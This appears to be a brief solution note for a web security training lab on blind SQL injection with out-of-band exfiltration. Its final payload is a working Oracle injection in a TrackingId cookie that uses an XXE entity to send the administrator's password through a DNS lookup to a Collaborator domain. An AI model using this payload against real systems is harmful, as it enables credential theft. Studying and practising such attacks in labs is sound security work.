# Lab 15: Blind SQL Injection with Out-of-Band Data Exfiltration

* **Solution**: Concatenate the admin password into a DNS lookup sent to a Collaborator domain, extracting it directly.
* **Final Payload**:
  * TrackingId=xyz' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual) --